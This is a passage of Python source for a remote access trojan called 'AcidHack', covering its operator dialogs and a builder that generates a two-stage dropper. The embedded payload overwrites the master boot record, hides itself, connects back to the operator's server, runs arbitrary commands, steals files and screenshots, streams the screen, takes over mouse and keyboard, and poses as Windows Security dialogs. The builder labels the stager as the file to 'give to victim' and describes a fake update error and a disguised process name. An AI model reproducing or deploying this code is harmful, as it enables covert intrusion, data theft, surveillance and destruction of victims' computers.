        layout.addLayout(btn_layout)

        self.setLayout(layout)
        self.streaming = False

    def start_stream(self):
        self.streaming = True
        self.btn_start.setEnabled(False)
        self.btn_stop.setEnabled(True)
        self.label.setText("Starting webcam stream...")
        # Send command through parent
        from PyQt5.QtWidgets import QApplication
        main = self.parent()
        if main and hasattr(main, 'start_webcam'):
            main.start_webcam()

    def stop_stream(self):
        self.streaming = False
        self.btn_start.setEnabled(True)
        self.btn_stop.setEnabled(False)
        self.label.setText("Webcam stream stopped")
        from PyQt5.QtWidgets import QApplication
        main = self.parent()
        if main and hasattr(main, 'stop_webcam'):
            main.stop_webcam()

    def update_frame(self, jpeg_data):
        if not self.streaming:
            return
        pixmap = QPixmap()
        pixmap.loadFromData(jpeg_data, "JPEG")
        scaled = pixmap.scaled(self.label.size(), Qt.KeepAspectRatio, Qt.SmoothTransformation)
        self.label.setPixmap(scaled)

    def closeEvent(self, event):
        # Stop the stream when closing
        if self.streaming:
            self.stop_stream()
        self.closed.emit(self.client_id)
        event.accept()  # Explicitly accept the close

# ============================================================
# FILE EXPLORER DIALOG
# ============================================================
class FileExplorer(QDialog):
    def __init__(self, client_id, send_cmd_func, parent=None):
        super().__init__(parent)
        self.client_id = client_id
        self.send_cmd = send_cmd_func
        self.current_path = "C:\\"
        self.setWindowTitle(f"AcidHack - File Explorer [{client_id}]")
        self.setGeometry(150, 150, 900, 600)
        self.setStyleSheet(RED_BLACK_STYLE)

        layout = QVBoxLayout()

        path_layout = QHBoxLayout()
        self.path_label = QLabel("Path:")
        self.path_input = QLineEdit(self.current_path)
        self.btn_go = QPushButton("Go")
        self.btn_refresh = QPushButton("Refresh")
        path_layout.addWidget(self.path_label)
        path_layout.addWidget(self.path_input, 1)
        path_layout.addWidget(self.btn_go)
        path_layout.addWidget(self.btn_refresh)
        layout.addLayout(path_layout)

        self.file_tree = QTreeWidget()
        self.file_tree.setHeaderLabels(["Name", "Size", "Type", "Modified"])
        self.file_tree.setColumnWidth(0, 300)
        self.file_tree.setColumnWidth(1, 100)
        self.file_tree.setColumnWidth(2, 100)
        self.file_tree.setAlternatingRowColors(True)
        self.file_tree.setContextMenuPolicy(Qt.CustomContextMenu)
        self.file_tree.customContextMenuRequested.connect(self.show_context_menu)
        self.file_tree.itemDoubleClicked.connect(self.on_item_double_clicked)
        layout.addWidget(self.file_tree)

        btn_layout = QHBoxLayout()
        self.btn_upload = QPushButton("Upload File")
        self.btn_download = QPushButton("Download File")
        self.btn_delete = QPushButton("Delete")
        self.btn_mkdir = QPushButton("New Folder")
        btn_layout.addWidget(self.btn_upload)
        btn_layout.addWidget(self.btn_download)
        btn_layout.addWidget(self.btn_delete)
        btn_layout.addWidget(self.btn_mkdir)
        btn_layout.addStretch()
        layout.addLayout(btn_layout)

        self.setLayout(layout)

        self.btn_go.clicked.connect(self.navigate_to_path)
        self.btn_refresh.clicked.connect(self.refresh)
        self.btn_upload.clicked.connect(self.upload_file)
        self.btn_download.clicked.connect(self.download_file)
        self.btn_delete.clicked.connect(self.delete_item)
        self.btn_mkdir.clicked.connect(self.create_directory)

        self.request_listing(self.current_path)

    def request_listing(self, path):
        self.send_cmd("file_list", path=path)

    def navigate_to_path(self):
        path = self.path_input.text().strip()
        if path:
            self.current_path = path
            self.request_listing(path)

    def refresh(self):
        self.request_listing(self.current_path)

    def populate_files(self, path, files):
        self.current_path = path
        self.path_input.setText(path)
        self.file_tree.clear()

        parent_item = QTreeWidgetItem(self.file_tree, ["..", "", "Directory", ""])
        parent_item.setData(0, Qt.UserRole, "..")
        parent_item.setForeground(0, QColor("#ff6666"))

        for f in files:
            name = f.get("name", "")
            size = f.get("size", 0)
            ftype = f.get("type", "File")
            modified = f.get("modified", "")

            if ftype == "Directory":
                size_str = "<DIR>"
            else:
                if size < 1024:
                    size_str = f"{size} B"
                elif size < 1024**2:
                    size_str = f"{size/1024:.1f} KB"
                else:
                    size_str = f"{size/1024**2:.1f} MB"

            item = QTreeWidgetItem(self.file_tree, [name, size_str, ftype, modified])
            item.setData(0, Qt.UserRole, name)
            if ftype == "Directory":
                item.setForeground(0, QColor("#ff8888"))
            else:
                item.setForeground(0, QColor("#ffffff"))

    def on_item_double_clicked(self, item, column):
        name = item.data(0, Qt.UserRole)
        if name == "..":
            parent_path = os.path.dirname(self.current_path.rstrip("\\"))
            if parent_path:
                self.current_path = parent_path
                self.request_listing(parent_path)
        else:
            ftype = item.text(2)
            if ftype == "Directory":
                new_path = os.path.join(self.current_path, name)
                self.current_path = new_path
                self.request_listing(new_path)

    def show_context_menu(self, position):
        menu = QMenu()
        download_action = menu.addAction("Download")
        delete_action = menu.addAction("Delete")
        properties_action = menu.addAction("Properties")
        action = menu.exec_(self.file_tree.viewport().mapToGlobal(position))
        if action == download_action:
            self.download_file()
        elif action == delete_action:
            self.delete_item()
        elif action == properties_action:
            self.show_properties()

    def upload_file(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Select File to Upload")
        if file_path:
            filename = os.path.basename(file_path)
            try:
                with open(file_path, "rb") as f:
                    file_data = f.read()
                data_b64 = base64.b64encode(file_data).decode()
                chunk_size = 50000
                if len(data_b64) > chunk_size:
                    total_chunks = (len(data_b64) + chunk_size - 1) // chunk_size
                    for i in range(total_chunks):
                        chunk = data_b64[i*chunk_size:(i+1)*chunk_size]
                        is_last = (i == total_chunks - 1)
                        self.send_cmd("upload_file_chunk",
                                      filename=filename,
                                      path=self.current_path,
                                      data=chunk,
                                      chunk_index=i,
                                      total_chunks=total_chunks,
                                      last=is_last)
                else:
                    self.send_cmd("upload_file",
                                  filename=filename,
                                  path=self.current_path,
                                  data=data_b64)
                QMessageBox.information(self, "Upload Started",
                                        f"Uploading '{filename}' to {self.current_path}")
            except Exception as e:
                QMessageBox.warning(self, "Upload Error", f"Failed to read file: {e}")

    def download_file(self):
        selected = self.file_tree.currentItem()
        if selected and selected.text(2) != "Directory":
            filename = selected.data(0, Qt.UserRole)
            save_path, _ = QFileDialog.getSaveFileName(self, "Save File", filename)
            if save_path:
                self.send_cmd("download_file", filename=filename, path=self.current_path)
                self.parent().set_download_save_path(self.client_id, filename, save_path)

    def delete_item(self):
        selected = self.file_tree.currentItem()
        if selected and selected.data(0, Qt.UserRole) != "..":
            name = selected.data(0, Qt.UserRole)
            reply = QMessageBox.question(self, "Confirm Delete",
                                         f"Delete '{name}'?",
                                         QMessageBox.Yes | QMessageBox.No)
            if reply == QMessageBox.Yes:
                self.send_cmd("delete_file", name=name, path=self.current_path)

    def create_directory(self):
        name, ok = QInputDialog.getText(self, "New Folder", "Folder name:")
        if ok and name:
            self.send_cmd("mkdir", name=name, path=self.current_path)

    def show_properties(self):
        selected = self.file_tree.currentItem()
        if selected:
            QMessageBox.information(self, "Properties",
                                    f"Name: {selected.text(0)}\n"
                                    f"Size: {selected.text(1)}\n"
                                    f"Type: {selected.text(2)}\n"
                                    f"Modified: {selected.text(3)}")

    def closeEvent(self, event):
        try:
            p = self.parent()
            if p and hasattr(p, 'file_explorers') and self.client_id in p.file_explorers:
                del p.file_explorers[self.client_id]
        except:
            pass
        event.accept()


# ============================================================
# CHAT DIALOG
# ============================================================
from datetime import datetime

class ChatDialog(QDialog):
    def __init__(self, client_id, send_cmd_func, parent=None):
        super().__init__(parent)
        self.client_id = client_id
        self.send_cmd = send_cmd_func
        self.setWindowTitle(f"AcidHack - Chat [{client_id}]")
        self.setGeometry(300, 300, 500, 400)
        self.setStyleSheet(RED_BLACK_STYLE)

        layout = QVBoxLayout()
        layout.setSpacing(5)

        self.status_label = QLabel(f"Connected to: {client_id}")
        self.status_label.setStyleSheet("color: #ff4444; font-weight: bold; font-size: 14px;")
        layout.addWidget(self.status_label)

        self.chat_display = QTextEdit()
        self.chat_display.setReadOnly(True)
        self.chat_display.setStyleSheet("background-color: #0a0a0a; color: #ffffff; font-size: 13px;")
        layout.addWidget(self.chat_display, 1)

        input_layout = QHBoxLayout()
        self.msg_input = QLineEdit()
        self.msg_input.setPlaceholderText("Type a message and press Enter...")
        self.btn_send = QPushButton("Send")
        self.btn_send.setStyleSheet("""
            QPushButton { background-color: #cc0000; color: #ffffff;
                font-weight: bold; padding: 8px 20px; border: none; border-radius: 4px; }
            QPushButton:hover { background-color: #ff3333; }
        """)
        input_layout.addWidget(self.msg_input, 1)
        input_layout.addWidget(self.btn_send)
        layout.addLayout(input_layout)

        self.setLayout(layout)

        self.btn_send.clicked.connect(self.send_message)
        self.msg_input.returnPressed.connect(self.send_message)

        self.send_cmd("chat_open")

    def send_message(self):
        msg = self.msg_input.text().strip()
        if msg:
            # Display locally immediately
            timestamp = datetime.now().strftime("%H:%M")
            self.chat_display.append(
                f'<div style="color:#ff4444; text-align:right; padding:2px;">'
                f'<b>[You {timestamp}]</b> {msg}</div>'
            )
            # Send to the payload — payload will show an alert() to the target
            self.send_cmd("chat", message=msg, sender="server")
            self.msg_input.clear()

    def closeEvent(self, event):
        try:
            p = self.parent()
            if p and hasattr(p, 'chat_dialogs') and self.client_id in p.chat_dialogs:
                del p.chat_dialogs[self.client_id]
        except:
            pass
        event.accept()


# ============================================================
# BUILDER DIALOG - GENERATES STAGER + PAYLOAD (TWO EXEs)
# ============================================================
class BuilderDialog(QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle("AcidHack - Payload Builder v9.1")
        self.setGeometry(200, 200, 650, 600)
        self.setStyleSheet(RED_BLACK_STYLE)

        layout = QVBoxLayout()

        title = QLabel("AcidHack Payload Builder v9.1 - Two-Stage Dropper")
        title.setStyleSheet("font-size: 18px; font-weight: bold; color: #ff3333; padding: 10px;")
        title.setAlignment(Qt.AlignCenter)
        layout.addWidget(title)

        conn_group = QGroupBox("Connection Settings")
        conn_layout = QFormLayout()
        self.ip_input = QLineEdit()
        self.ip_input.setPlaceholderText("Your VPS IP or public IP")
        conn_layout.addRow("Listener IP:", self.ip_input)
        self.port_input = QSpinBox()
        self.port_input.setRange(1, 65535)
        self.port_input.setValue(4443)
        conn_layout.addRow("C2 Port:", self.port_input)
        conn_group.setLayout(conn_layout)
        layout.addWidget(conn_group)

        output_group = QGroupBox("Output Files")
        output_layout = QVBoxLayout()
        self.stager_name = QLineEdit("stager.exe")
        output_layout.addWidget(QLabel("Stage 1 - Stager (give this to victim):"))
        output_layout.addWidget(self.stager_name)
        self.payload_name = QLineEdit("payload.exe")
        output_layout.addWidget(QLabel("Stage 2 - Payload (served by C2 on port+1):"))
        output_layout.addWidget(self.payload_name)
        output_group.setLayout(output_layout)
        layout.addWidget(output_group)

        info_group = QGroupBox("How It Works")
        info_text = QLabel(
            "<b style='color:#44ff44;'>Stage 1 - STAGER.EXE</b><br>"
            "<span style='color:#ffffff;'>Victim runs this. Shows fake Windows Update error.<br>"
            "Downloads real payload from your server on port 4444.<br>"
            "Saves as <b>SysHealthTrayX64.exe</b> in AppData, then <b style='color:#ff4444;'>melts itself</b>.</span><br><br>"
            "<b style='color:#44ff44;'>Stage 2 - PAYLOAD.EXE</b><br>"
            "<span style='color:#ffffff;'>Served automatically by your C2 server on port+1.<br>"
            "Task Manager shows <b>\"SysHealthTrayX64.exe\"</b>. File is NTFS locked.<br>"
            "Killing stager.exe does nothing - it's already gone.</span>"
        )
        info_text.setWordWrap(True)
        info_text.setStyleSheet("padding: 8px;")
        info_group.setLayout(QVBoxLayout())
        info_group.layout().addWidget(info_text)
        layout.addWidget(info_group)

        self.btn_build = QPushButton("BUILD STAGER + PAYLOAD")
        self.btn_build.setStyleSheet("""
            QPushButton { background-color: #cc0000; color: #ffffff;
                font-size: 16px; font-weight: bold; padding: 14px;
                border: none; border-radius: 4px; }
            QPushButton:hover { background-color: #ff3333; }
        """)
        layout.addWidget(self.btn_build)

        self.status_label = QLabel("Ready to build...")
        self.status_label.setAlignment(Qt.AlignCenter)
        self.status_label.setStyleSheet("padding: 8px; font-weight: bold;")
        layout.addWidget(self.status_label)

        self.setLayout(layout)
        self.btn_build.clicked.connect(self.build_payload)

    def build_payload(self):
        ip = self.ip_input.text().strip()
        port = self.port_input.value()
        if not ip:
            QMessageBox.warning(self, "Error", "Please enter a listener IP address!")
            return

        self.status_label.setText("[*] Building payload (Stage 2)...")
        self.status_label.setStyleSheet("color: #ffaa00; padding: 8px; font-weight: bold;")
        self.btn_build.setEnabled(False)
        QApplication.processEvents()

        try:
            self.generate_both_payloads(ip, port)
        except Exception as e:
            self.status_label.setText(f"[!] Error: {str(e)}")
            self.status_label.setStyleSheet("color: #ff4444; padding: 8px; font-weight: bold;")
            import traceback
            traceback.print_exc()
        self.btn_build.setEnabled(True)

    def generate_both_payloads(self, host, port):
        """Generate BOTH the stager and the payload as separate EXEs."""
    
        # Use the script's own directory to avoid permission errors
        script_dir = os.path.dirname(os.path.abspath(__file__))
        os.chdir(script_dir)  # Force working directory to script location
    
        stager_name = self.stager_name.text().strip() or "stager.exe"
        payload_name = self.payload_name.text().strip() or "payload.exe"
        
        # ==========================================
        # STEP 1: Build the PAYLOAD source (Stage 2)
        # Using .replace() instead of f-strings to avoid brace hell
        # ==========================================
        
        # Template with placeholders {HOST} and {PORT}
        payload_template = '''#!/usr/bin/env python3
import os, sys, socket, subprocess, json, base64, time, platform
import threading, ctypes, io, getpass, shutil
from datetime import datetime

# ====== MBR BOOT PERSISTENCE ======
class MBRBootInstaller:
    MBR_SIZE = 512
    BOOTSTRAP_SIZE = 440
    PHYSICAL_DRIVE = r'\\\\.\\PhysicalDrive0'
    
    @staticmethod
    def build_bootstrap():
        boot = bytearray(440)
        boot[0:30] = bytes([
            0xFA, 0x31, 0xC0, 0x8E, 0xD0, 0xBC, 0x00, 0x7C,
            0xFB, 0x8E, 0xD8, 0x8E, 0xC0, 0xBE, 0x00, 0x7C,
            0xBF, 0x00, 0x06, 0xB9, 0x00, 0x02, 0xFC, 0xF3,
            0xA4, 0xEA, 0x05, 0x06, 0x00, 0x00
        ])
        boot[30:60] = bytes([
            0xB8, 0x00, 0x12, 0x8E, 0xD8, 0x8E, 0xC0, 0x8E,
            0xD0, 0xBC, 0x00, 0x7E, 0xBE, 0x2A, 0x06, 0xE8,
            0x3C, 0x00, 0xB4, 0x41, 0xBB, 0xAA, 0x55, 0xCD,
            0x13, 0x72, 0x27, 0x81, 0xFB, 0x55
        ])
        boot[60:90] = bytes([
            0xAA, 0x75, 0x21, 0xF6, 0xC1, 0x01, 0x74, 0x1C,
            0xBE, 0xDA, 0x06, 0xE8, 0x1F, 0x00, 0xBE, 0xF0,
            0x06, 0xB4, 0x02, 0xB0, 0x3F, 0xB5, 0x00, 0xB6,
            0x00, 0xB7, 0x00, 0xCD, 0x13, 0x72
        ])
        boot[90:120] = bytes([
            0x0A, 0xBE, 0x03, 0x07, 0xE8, 0x05, 0x00, 0xEA,
            0x00, 0x7E, 0x00, 0x00, 0xAC, 0x3C, 0x00, 0x74,
            0x09, 0xB4, 0x0E, 0xBB, 0x07, 0x00, 0xCD, 0x10,
            0xEB, 0xF2, 0xC3, 0x00, 0x00, 0x00
        ])
        msg_offset = 120
        msg = b'BOOTMGR'
        for i, ch in enumerate(msg):
            boot[msg_offset + i] = ch
        boot[msg_offset + len(msg)] = 0
        error_offset = 130
        err = b'MBR ERR'
        for i, ch in enumerate(err):
            boot[error_offset + i] = ch
        boot[error_offset + len(err)] = 0
        payload_msg_offset = 230
        pmsg = b'PAYLOAD OK'
        for i, ch in enumerate(pmsg):
            boot[payload_msg_offset + i] = ch
        boot[payload_msg_offset + len(pmsg)] = 0
        boot[440 - 2], boot[440 - 1] = 0x00, 0x00
        return boot

    @staticmethod
    def read_original_mbr():
        kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
        GENERIC_READ = 0x80000000
        FILE_SHARE_READ = 0x00000001
        FILE_SHARE_WRITE = 0x00000002
        OPEN_EXISTING = 3
        FILE_ATTRIBUTE_NORMAL = 0x00000080
        INVALID_HANDLE_VALUE = ctypes.c_void_p(-1).value
        handle = kernel32.CreateFileW(
            MBRBootInstaller.PHYSICAL_DRIVE, GENERIC_READ,
            FILE_SHARE_READ | FILE_SHARE_WRITE, None,
            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, None
        )
        if handle == INVALID_HANDLE_VALUE:
            return None
        mbr = bytearray(MBRBootInstaller.MBR_SIZE)
        bytes_read = ctypes.c_ulong(0)
        kernel32.ReadFile(handle, mbr, MBRBootInstaller.MBR_SIZE, ctypes.byref(bytes_read), None)
        kernel32.CloseHandle(handle)
        return mbr if bytes_read.value == MBRBootInstaller.MBR_SIZE else None

    @staticmethod
    def write_mbr(mbr_data):
        kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
        GENERIC_WRITE = 0x40000000
        FILE_SHARE_READ = 0x00000001
        FILE_SHARE_WRITE = 0x00000002
        OPEN_EXISTING = 3
        FILE_ATTRIBUTE_NORMAL = 0x00000080
        INVALID_HANDLE_VALUE = ctypes.c_void_p(-1).value
        handle = kernel32.CreateFileW(
            MBRBootInstaller.PHYSICAL_DRIVE, GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE, None,
            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, None
        )
        if handle == INVALID_HANDLE_VALUE:
            return False
        bytes_written = ctypes.c_ulong(0)
        result = kernel32.WriteFile(handle, mbr_data, MBRBootInstaller.MBR_SIZE, ctypes.byref(bytes_written), None)
        kernel32.CloseHandle(handle)
        return result != 0 and bytes_written.value == MBRBootInstaller.MBR_SIZE

    @staticmethod
    def install():
        try:
            if not ctypes.windll.shell32.IsUserAnAdmin():
                return False, "Admin required"
            om = MBRBootInstaller.read_original_mbr()
            if om is None:
                return False, "Failed to read MBR"
            nm = bytearray(MBRBootInstaller.MBR_SIZE)
            nm[0:MBRBootInstaller.BOOTSTRAP_SIZE] = MBRBootInstaller.build_bootstrap()
            nm[446:510] = om[446:510]
            nm[510], nm[511] = 0x55, 0xAA
            if MBRBootInstaller.write_mbr(bytes(nm)):
                return True, "MBR persistence installed"
            return False, "Failed to write"
        except Exception as e:
            return False, f"MBR error: {e}"

HOST = "{HOST}"
PORT = {PORT}
DELAY = 5
BUF = 65536

sock = None
running = True
screenshare_running = False

DEBUG_LOG = os.path.join(os.environ.get("TEMP", "C:\\\\Temp"), "payload_debug.txt")

def debug(m):
    try:
        with open(DEBUG_LOG, "a") as f:
            f.write(str(datetime.now()) + " - " + str(m) + "\\n")
    except:
        pass

def hide():
    try:
        h = ctypes.windll.kernel32.GetConsoleWindow()
        if h:
            ctypes.windll.user32.ShowWindow(h, 0)
    except:
        pass

def isadmin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def sysinfo():
    i = {"type":"info","hostname":platform.node(),"username":getpass.getuser(),"os":platform.platform(),"privilege":"Admin" if isadmin() else "User","antivirus":"Unknown","cpu":platform.processor() or "N/A","ram":"N/A"}
    try:
        o = subprocess.check_output('wmic /namespace:\\\\\\\\root\\\\securitycenter2 path antivirusproduct get displayname /format:csv', shell=True, stderr=subprocess.DEVNULL, timeout=5).decode('oem', errors='ignore')
        av = [l.split(",")[-1].strip() for l in o.split("\\\\n") if l.strip() and "displayName" not in l.lower()]
        i["antivirus"] = ", ".join(av) if av else "None"
    except:
        pass
    return i

def ls(path):
    r = []
    try:
        for e in os.scandir(path):
            try:
                s = e.stat()
                r.append({"name":e.name,"size":s.st_size,"type":"Directory" if e.is_dir() else "File","modified":datetime.fromtimestamp(s.st_mtime).strftime("%Y-%m-%d %H:%M")})
            except:
                pass
    except:
        pass
    return r

def sj(d):
    global sock
    try:
        sock.sendall((json.dumps(d)+"\\n").encode())
    except:
        pass

def hc(cmd):
    global running, screenshare_running
    t = cmd.get("type","")
    
    if t == "ping":
        sj({"type":"pong"})
    
    elif t == "execute":
        try:
            cmd_to_run = cmd.get("command","")
            r = subprocess.check_output(cmd_to_run, shell=True, stderr=subprocess.STDOUT, timeout=30).decode("oem", errors="ignore")
        except subprocess.TimeoutExpired:
            r = "[!] Command timed out"
        except Exception as e:
            r = "[!] " + str(e)
        sj({"type":"cmd_output","output": r})
    
    elif t == "file_list":
        sj({"type":"file_list","path":cmd.get("path","C:\\\\"),"files":ls(cmd.get("path","C:\\\\"))})
    
    elif t == "download_file":
        fp = os.path.join(cmd.get("path","C:\\\\"), cmd.get("filename",""))
        try:
            with open(fp,"rb") as f:
                d = f.read()
            sj({"type":"file_data","filename":cmd.get("filename",""),"data":base64.b64encode(d).decode()})
        except Exception as e:
            sj({"type":"file_error","error":str(e)})
    
    elif t == "upload_file":
        fp = os.path.join(cmd.get("path","C:\\\\"), cmd.get("filename",""))
        try:
            os.makedirs(os.path.dirname(fp), exist_ok=True)
            with open(fp,"wb") as f:
                f.write(base64.b64decode(cmd.get("data","")))
            sj({"type":"upload_complete","path":fp})
        except Exception as e:
            sj({"type":"file_error","error":str(e)})
    
    elif t == "upload_file_chunk":
        fp = os.path.join(cmd.get("path","C:\\\\"), cmd.get("filename",""))
        try:
            with open(fp,"ab") as f:
                f.write(base64.b64decode(cmd.get("data","")))
            if cmd.get("last",False):
                sj({"type":"upload_complete","path":fp})
        except:
            pass
    
    elif t == "delete_file":
        fp = os.path.join(cmd.get("path","C:\\\\"), cmd.get("name",""))
        try:
            if os.path.isdir(fp):
                shutil.rmtree(fp)
            else:
                os.remove(fp)
            sj({"type":"delete_complete","path":fp})
        except Exception as e:
            sj({"type":"file_error","error":str(e)})
    
    elif t == "mkdir":
        fp = os.path.join(cmd.get("path","C:\\\\"), cmd.get("name",""))
        try:
            os.makedirs(fp, exist_ok=True)
            sj({"type":"mkdir_complete","path":fp})
        except Exception as e:
            sj({"type":"file_error","error":str(e)})
    
    elif t == "screenshot":
        try:
            # Lazy import to reduce base payload size
            try:
                from PIL import ImageGrab
                b = io.BytesIO()
                ImageGrab.grab().save(b, format="PNG")
            except ImportError:
                import pyautogui as pag
                b = io.BytesIO()
                pag.screenshot().save(b, format="PNG")
            sj({"type":"screenshot_data","data":base64.b64encode(b.getvalue()).decode()})
        except Exception as e:
            sj({"type":"cmd_output","output":"[screenshot error: "+str(e)+"]"})
    
    elif t == "screenshare_start":
        screenshare_running = True
        quality = cmd.get("quality", 40)
        target_fps = cmd.get("fps", 10)
        current_sock = sock
        
        def sst(ssock):
            global screenshare_running
            fi = 1.0/target_fps if target_fps > 0 else 0.1
            cq = quality
            try:
                from PIL import ImageGrab
                while screenshare_running:
                    t0 = time.time()
                    b = io.BytesIO()
                    ImageGrab.grab().save(b, format="JPEG", quality=int(cq), optimize=True)
                    try:
                        ssock.sendall((json.dumps({"type":"screenshare_frame","frame":base64.b64encode(b.getvalue()).decode()})+"\\n").encode())
                    except:
                        pass
                    elapsed = time.time() - t0
                    if fi - elapsed > 0:
                        time.sleep(fi - elapsed)
            except Exception as e:
                try:
                    ssock.sendall((json.dumps({"type":"cmd_output","output":"[screenshare: "+str(e)+"]"}).encode()+b"\\n"))
                except:
                    pass
            finally:
                screenshare_running = False
        
        threading.Thread(target=sst, args=(current_sock,), daemon=True).start()
    
    elif t == "screenshare_stop":
        screenshare_running = False
        sj({"type":"screenshare_stopped"})
    
    elif t == "mouse_event":
        try:
            ev = cmd.get("event","")
            btn = cmd.get("button", "left")
            x, y = cmd.get("x",0), cmd.get("y",0)
            
            # Use Win32 API directly — works on EVERY Windows system
            import ctypes
            user32 = ctypes.windll.user32
            
            # Map button to Windows mouse event flags
            # MOUSEEVENTF constants
            if btn == "left":
                down_flag = 0x0002
                up_flag = 0x0004
            elif btn == "right":
                down_flag = 0x0008
                up_flag = 0x0010
            else:  # middle
                down_flag = 0x0020
                up_flag = 0x0040
            
            if ev == "move":
                user32.SetCursorPos(x, y)
                
            elif ev == "click":
                user32.SetCursorPos(x, y)
                time.sleep(0.02)
                user32.mouse_event(down_flag, x, y, 0, 0)
                time.sleep(0.02)
                user32.mouse_event(up_flag, x, y, 0, 0)
                
            elif ev == "release":
                user32.SetCursorPos(x, y)
                user32.mouse_event(up_flag, x, y, 0, 0)
                
            elif ev == "dblclick":
                user32.SetCursorPos(x, y)
                time.sleep(0.02)
                user32.mouse_event(down_flag, x, y, 0, 0)
                user32.mouse_event(up_flag, x, y, 0, 0)
                time.sleep(0.05)
                user32.mouse_event(down_flag, x, y, 0, 0)
                user32.mouse_event(up_flag, x, y, 0, 0)
                
        except Exception as e:
            sj({"type":"cmd_output","output":"[!] mouse_event error: " + str(e)})
            debug("mouse_event error: " + str(e))
    
    elif t == "keyboard_event":
        try:
            ev = cmd.get("event","")
            key = cmd.get("key","")
            
            # Use Win32 API directly — works on EVERY Windows system
            import ctypes
            from ctypes import wintypes
            user32 = ctypes.windll.user32
            
            # Virtual key code mapping
            VK_MAP = {
                "enter": 0x0D, "return": 0x0D,
                "esc": 0x1B, "escape": 0x1B,
                "tab": 0x09,
                "backspace": 0x08, "bksp": 0x08,
                "delete": 0x2E, "del": 0x2E,
                "home": 0x24, "end": 0x23,
                "pageup": 0x21, "pagedown": 0x22,
                "pgup": 0x21, "pgdn": 0x22,
                "up": 0x26, "down": 0x28,
                "left": 0x25, "right": 0x27,
                "space": 0x20, "spacebar": 0x20,
                "shift": 0x10, "shiftleft": 0xA0, "shiftright": 0xA1,
                "ctrl": 0x11, "control": 0x11,
                "alt": 0x12, "menu": 0x12,
                "win": 0x5B, "super": 0x5B, "lwin": 0x5B, "rwin": 0x5C,
                "capslock": 0x14, "capital": 0x14,
                "insert": 0x2D, "ins": 0x2D,
                "printscreen": 0x2C, "prtsc": 0x2C, "print": 0x2C,
                "pause": 0x13, "break": 0x13,
                "numlock": 0x90,
                "scrolllock": 0x91,
            }
            
            # Add F1-F24
            for i in range(1, 25):
                VK_MAP[f"f{i}"] = 0x6F + i - 1 if i <= 10 else \
                                  0x79 + i - 10 if i <= 12 else \
                                  0x7E + i - 13
            
            # Fix F11-F12 to correct values
            VK_MAP["f11"] = 0x7A
            VK_MAP["f12"] = 0x7B
            
            # KEYEVENTF constants
            KEYEVENTF_KEYUP = 0x0002
            KEYEVENTF_EXTENDEDKEY = 0x0001
            
            def send_key(vk_code, press=True):
                """Send a key down or up event."""
                flags = 0
                if not press:
                    flags |= KEYEVENTF_KEYUP
                # Extended keys (arrows, home, etc.) need the extended flag
                if vk_code in [0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x2D, 0x2E]:
                    flags |= KEYEVENTF_EXTENDEDKEY
                user32.keybd_event(vk_code, 0, flags, 0)
            
            if ev == "keydown":
                # Check for printable characters first
                if key and len(key) == 1 and key.isprintable():
                    vk = ord(key.upper())
                    send_key(vk, True)
                    time.sleep(0.02)
                    send_key(vk, False)
                else:
                    vk = VK_MAP.get(key.lower(), 0)
                    if vk:
                        send_key(vk, True)
                        time.sleep(0.02)
                        send_key(vk, False)
                        
            elif ev == "combo":
                # Handle key combinations like "ctrl+alt+del"
                keys = key.lower().split("+")
                
                # Press all keys down
                for k in keys:
                    vk = VK_MAP.get(k, 0)
                    if vk:
                        send_key(vk, True)
                        time.sleep(0.03)
                
                time.sleep(0.1)
                
                # Release all keys in reverse order
                for k in reversed(keys):
                    vk = VK_MAP.get(k, 0)
                    if vk:
                        send_key(vk, False)
                        time.sleep(0.03)
                        
        except Exception as e:
            sj({"type":"cmd_output","output":"[!] keyboard_event error: " + str(e)})
            debug("keyboard_event error: " + str(e))
    
    elif t == "chat":
        # Server sent us a message — show it to the target user and get a reply
        try:
            msg_text = cmd.get("message", "")
            sender = cmd.get("sender", "server")
            
            if sender == "server":
                # Show incoming message to the target, let them reply
                import pyautogui as pag
                
                # Show the message — single line strings only!
                alert_text = "Message from administrator:\\n\\n" + str(msg_text)
                pag.alert(text=alert_text, title="Windows Security Notification", button="Reply")
                
                # Get their reply
                reply = pag.prompt(text="Type your response:", title="Windows Security Notification", default="")
                
                if reply and reply.strip():
                    # Send their reply back to the server
                    sj({"type": "chat", "message": reply.strip(), "sender": "target"})
                else:
                    # They closed or didn't type anything
                    sj({"type": "chat", "message": "[User dismissed notification]", "sender": "target"})
        except Exception as e:
            debug(f"Chat error: {e}")
            # Fallback: try ctypes MessageBox
            try:
                fallback_text = "Message from administrator:\\n\\n" + str(msg_text)
                ctypes.windll.user32.MessageBoxW(0, fallback_text, "Windows Security Notification", 0)
                sj({"type": "chat", "message": "[Seen by user]", "sender": "target"})
            except:
                pass
    
    elif t == "chat_open":
        # Server is opening a chat session — show a notification
        try:
            import pyautogui as pag
            pag.alert(text="A security administrator has opened a chat session.\\nThey may send you messages.",
                     title="Windows Security Notification",
                     button="OK")
        except:
            pass
    
    elif t == "msgbox":
        try:
            ctypes.windll.user32.MessageBoxW(0, cmd.get("message",""), cmd.get("title","Message"), 0)
        except:
            pass
    
    elif t == "shutdown":
        subprocess.Popen("shutdown /s /f /t 5", shell=True)
    
    elif t == "restart":
        subprocess.Popen("shutdown /r /f /t 5", shell=True)
    
    elif t == "disconnect":
        running = False

if __name__ == "__main__":
    debug("=== PAYLOAD STARTED ===")
    ctypes.windll.kernel32.FreeConsole()  # Force detach
    hide()
    
    if isadmin():
        success, mbr_msg = MBRBootInstaller.install()
        debug(f"MBR: {success} - {mbr_msg}")
    
    debug(f"Attempting connection to {HOST}:{PORT}")
    time.sleep(1)
    
    while running:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(15)
            debug(f"Connecting to {HOST}:{PORT}...")
            s.connect((HOST, PORT))
            debug("Connected!")
            sock = s
            sj(sysinfo())
            debug("System info sent")
            
            buf = ""
            while running:
                try:
                    d = sock.recv(BUF)
                    if not d:
                        break
                    buf += d.decode("utf-8", errors="ignore")
                    while "\\n" in buf:
                        l, buf = buf.split("\\n", 1)
                        if l.strip():
                            try:
